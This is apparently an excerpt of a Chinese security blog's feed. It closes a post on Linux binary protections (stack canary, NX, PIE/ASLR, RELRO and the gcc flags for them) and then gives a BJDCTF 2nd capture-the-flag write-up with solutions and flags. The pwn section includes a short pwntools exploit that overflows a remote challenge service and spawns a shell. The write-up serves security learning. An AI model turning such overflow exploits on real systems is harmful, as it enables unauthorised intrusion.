THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><h3 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE(ASLR)"></a>PIE(ASLR)</h3><p>PIE机制，在windows中被称作ASLR，即地址随机化。PIE在linux中作为内核参数存在，可在/proc/sys/kernel/randomize_va_space中找到其具体的值，0、1、2三个值代表不同的工作强度，具体如下：</p><ul><li>0 - 表示关闭进程地址空间随机化。</li><li>1 - 表示将mmap的基址，stack和vdso页面随机化。</li><li>2 - 表示在1的基础上增加栈（heap）的随机化。</li></ul><p>另外，<strong>地址随机化保护</strong>有“两个开关”，一个是系统环境下的地址随机化设置，一个是gcc编译时的地址随机化设置。</p><p>只有当系统环境下的随机化保护开启时，程序的随机化保护才会生效。</p><blockquote><p>注：gcc的随机化设置不影响程序运行时的堆栈段地址，仅影响程序本身的bss、data、text静态段地址</p></blockquote><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="设置命令"><a href="#设置命令" class="headerlink" title="设置命令"></a>设置命令</h3><ul><li>NX：-z execstack / -z noexecstack (关闭 / 开启) 不让执行栈上的数据，于是JMP ESP就不能用了</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) 栈里插入cookie信息</li><li>PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li></ul><h2 id="上篇-汐白学Pwn-1-准备"><a href="#上篇-汐白学Pwn-1-准备" class="headerlink" title="上篇-汐白学Pwn-1(准备)"></a><a href="http://xibai.xyz/2019/10/30/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-1(Ready)/">上篇-汐白学Pwn-1(准备)</a></h2><h2 id="下篇-汐白学pwn-3-1-ROP-Basic"><a href="#下篇-汐白学pwn-3-1-ROP-Basic" class="headerlink" title="下篇-汐白学pwn-3.1(ROP-Basic)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/">下篇-汐白学pwn-3.1(ROP-Basic)</a></h2>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="http://xibai.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>BJD-2rd_Writeup(SOME)</title>
    <link href="http://xibai.xyz/2020/03/24/BJD-2rd/"/>
    <id>http://xibai.xyz/2020/03/24/BJD-2rd/</id>
    <published>2020-03-24T13:41:36.970Z</published>
    <updated>2020-04-29T17:17:51.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BJDCTF-2nd-最简单的misc-y1ng"><a href="#BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="[BJDCTF 2nd]最简单的misc-y1ng"></a>[BJDCTF 2nd]最简单的misc-y1ng</h3><p>解压得到图片，打开看到一串十六进制，转ASCII字符得到flag</p><h3 id="BJDCTF-2nd-A-Beautiful-Picture"><a href="#BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="[BJDCTF 2nd]A_Beautiful_Picture"></a>[BJDCTF 2nd]A_Beautiful_Picture</h3><p>改一下png图片高度即可</p><h3 id="BJDCTF-2nd-小姐姐-y1ng"><a href="#BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="[BJDCTF 2nd]小姐姐-y1ng"></a>[BJDCTF 2nd]小姐姐-y1ng</h3><p>winhex搜索字符串，关键字<code>BJD</code></p><h3 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h3><p>winhex查看文件数据发现是avi类型的数据，打开发现里面放有二维码，拖进pr扫码，得到一串十六进制ASCII码，解码得到一串字符，该字符顺序明显不是原flag顺序，不过根据题目描述可以猜出二维码内容的排序</p><h3 id="BJDCTF-2nd-Real-EasyBaBa"><a href="#BJDCTF-2nd-Real-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]Real_EasyBaBa"></a>[BJDCTF 2nd]Real_EasyBaBa</h3><p>winhex发现文件末尾存在zip包，直接解压缩会报错，文件头附近会有包内的路径信息，所以直接搜索hint定位文件头，发现文件头被破坏了，修复一下拿到hint，打开发现是一个二维码，用手机晃动扫码（可以直接产生模糊效果，能省掉电脑PS的时间2333），得到一串命令，直接去kali里面对这个图片复制命令操作，发现：<br><img src="http://lychee.xibai.xyz/uploads/big/34e6bcf7c2f2910d657c9ed34abbe7f7.png" alt="rezbb"></p><h3 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h3><p>图片备注是解密后得到<code>key</code>，提示说正确的key没有最后的<code>com</code>，然后用outguess解密，key为密钥，得到flag</p><h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>虽然我曾说shell是最垃圾的语言，然而此刻还是，真香！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">flag=1</span><br><span class="line">while (($flag==1))</span><br><span class="line">do</span><br><span class="line">  file1=`ls | grep tar.gz`</span><br><span class="line">  if [ $&#123;file1:0-6&#125; == 'tar.gz' ]</span><br><span class="line">  then</span><br><span class="line">    unzip -P $&#123;file1::0-7&#125; $file1</span><br><span class="line">    rm $file1</span><br><span class="line">  else</span><br><span class="line">    cat $file1</span><br><span class="line">    flag=$flag+1</span><br><span class="line">  fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-Imagin-开场曲"><a href="#BJDCTF-2nd-Imagin-开场曲" class="headerlink" title="[BJDCTF 2nd]Imagin - 开场曲"></a>[BJDCTF 2nd]Imagin - 开场曲</h3><p>有一说一，再次体验到被针对的感觉，就是去mikutap人耳判断每个按键触发的声音和音频里的声音吻合度来判断按键。这里我的 <kbd>5</kbd> 对应的那个音是其他人 <kbd>1</kbd> 对应的音，心态炸裂。flag{mikutap3313313}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h3><p>base64解码</p><h3 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h3><p>查这几个生僻字读音可得：flag{这就是flag直接交了吧}<br>即：读音为大括号的生僻字中间的生僻字就是flag</p><h3 id="BJDCTF-2nd-cat-flag"><a href="#BJDCTF-2nd-cat-flag" class="headerlink" title="[BJDCTF 2nd]cat_flag"></a>[BJDCTF 2nd]cat_flag</h3><p>发现每一行有八只猫咪，总共十行，而且总共只有两种猫咪，所以将其转换为十个二进制ASCII码，再转成字符即可</p><h3 id="BJDCTF-2nd-灵能精通-y1ng"><a href="#BJDCTF-2nd-灵能精通-y1ng" class="headerlink" title="[BJDCTF 2nd]灵能精通-y1ng"></a>[BJDCTF 2nd]灵能精通-y1ng</h3><p>圣堂武士密码，猪圈密码变种</p><h3 id="BJDCTF-2nd-燕言燕语-y1ng"><a href="#BJDCTF-2nd-燕言燕语-y1ng" class="headerlink" title="[BJDCTF 2nd]燕言燕语-y1ng"></a>[BJDCTF 2nd]燕言燕语-y1ng</h3><p>十六进制转字符得到：yanzi ZJQ{xilzv_iqssuhoc_suzjg}<br>明显是维吉尼亚密码，yanzi 是 key，解密一下得到 flag<br>BJD{yanzi_jiushige_shabi}</p><h3 id="BJDCTF-2nd-Y1nglish-y1ng"><a href="#BJDCTF-2nd-Y1nglish-y1ng" class="headerlink" title="[BJDCTF 2nd]Y1nglish-y1ng"></a>[BJDCTF 2nd]Y1nglish-y1ng</h3><p>quipquip在线解密嘿嘿嘿，最后的flag修一下错误单词即可</p><h3 id="BJDCTF-2nd-rsa0"><a href="#BJDCTF-2nd-rsa0" class="headerlink" title="[BJDCTF 2nd]rsa0"></a>[BJDCTF 2nd]rsa0</h3><h3 id="BJDCTF-2nd-rsa1"><a href="#BJDCTF-2nd-rsa1" class="headerlink" title="[BJDCTF 2nd]rsa1"></a>[BJDCTF 2nd]rsa1</h3><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h3><p>简单的整数溢出<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330162304.png" alt="20200330162304"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330162326.png" alt="20200330162326"><br>可以输入<code>0x400</code>bytes的数据，但是会用<code>strlen</code>函数获取输入长度，要求长度大于3小于9，而覆盖<code>ret</code>的返回地址需要总共<code>0x19</code>bytes的数据。这时候注意<code>v3</code>是一个<code>int8</code>类型的无符号变量，也就是<code>v3</code>最大也只能是<code>255</code>，超过<code>255</code>的话相当于做了一次<code>%255</code>的运算。也就是我们可以通过输入大于<code>0x103</code>小于<code>0x109</code>bytes的数据来绕过if判断，从而成功劫持<code>EIP</code>。又发现程序内置了<code>system(&quot;/bin/sh&quot;)</code>函数，直接调用即可。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process("./r2t3")</span></span><br><span class="line">io = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27348</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">"a"</span>*<span class="number">0x15</span>+p32(<span class="number">0x08048594</span>)+<span class="string">'a'</span>*(<span class="number">0x105</span><span class="number">-0x19</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h3><h3 id="BJDCTF-2nd-ydsneedgirlfriend2"><a href="#BJDCTF-2nd-ydsneedgirlfriend2" class="headerlink" title="[BJDCTF 2nd]ydsneedgirlfriend2"></a>[BJDCTF 2nd]ydsneedgirlfriend2</h3><h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h3><h3 id="BJDCTF-2nd-secret"><a href="#BJDCTF-2nd-secret" class="headerlink" title="[BJDCTF 2nd]secret"></a>[BJDCTF 2nd]secret</h3><h3 id="BJDCTF-2nd-rci"><a href="#BJDCTF-2nd-rci" class="headerlink" title="[BJDCTF 2nd]rci"></a>[BJDCTF 2nd]rci</h3><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="BJDCTF-2nd-guessgame"><a href="#BJDCTF-2nd-guessgame" class="headerlink" title="[BJDCTF 2nd]guessgame"></a>[BJDCTF 2nd]guessgame</h3><p>拖进ida查找字符串即可得到flag</p><h3 id="BJDCTF-2nd-8086"><a href="#BJDCTF-2nd-8086" class="headerlink" title="[BJDCTF 2nd]8086"></a>[BJDCTF 2nd]8086</h3><p>ida查看发现一段没有用到的十六进制数据，已知的内容仅是一串明显加密了的字符串和一个死循环，很明显这串十六进制应该是做题的关键数据，使用ida的分析命令将其分析为汇编指令，发现果然是密文相关的操作。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330161628.png" alt="20200330161628"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330161858.png" alt="20200330161858"><br>写出脚本解得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag_encode = <span class="string">"]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag_encode:</span><br><span class="line">  flag += chr(ord(i)^<span class="number">0x1f</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-diff2"><a href="#BJDCTF-2nd-diff2" class="headerlink" title="[BJDCTF 2nd]diff2"></a>[BJDCTF 2nd]diff2</h3>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="CTF-Writeup" scheme="http://xibai.xyz/categories/CTF-Writeup/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
  </entry>
  
</feed>
